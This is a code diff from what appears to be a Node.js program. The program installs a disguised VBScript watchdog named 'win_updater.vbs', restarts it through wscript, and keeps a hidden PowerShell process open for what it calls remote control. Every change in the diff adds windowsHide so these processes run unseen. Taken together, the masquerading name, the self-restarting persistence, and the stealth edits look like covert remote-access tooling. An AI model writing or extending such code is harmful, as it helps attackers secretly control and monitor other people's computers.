@@ -32,10 +32,11 @@ Loop
     fs.writeFileSync(watchdogPath, vbsCode);
 
     // Kill any existing watchdog for our app, then start a new one
-    exec(`wmic process where "name='wscript.exe' and commandline like '%win_updater.vbs%'" call terminate`, () => {
+    exec(`wmic process where "name='wscript.exe' and commandline like '%win_updater.vbs%'" call terminate`, { windowsHide: true }, () => {
         const child = spawn('wscript.exe', [watchdogPath], {
             detached: true,
-            stdio: 'ignore'
+            stdio: 'ignore',
+            windowsHide: true
         });
         child.unref();
     });
@@ -43,7 +44,7 @@ Loop
 
 let psControl = null;
 function setupRemoteControl() {
-    psControl = spawn('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', '-']);
+    psControl = spawn('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', '-'], { windowsHide: true });
     const setupScript = `
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -MemberDefinition '
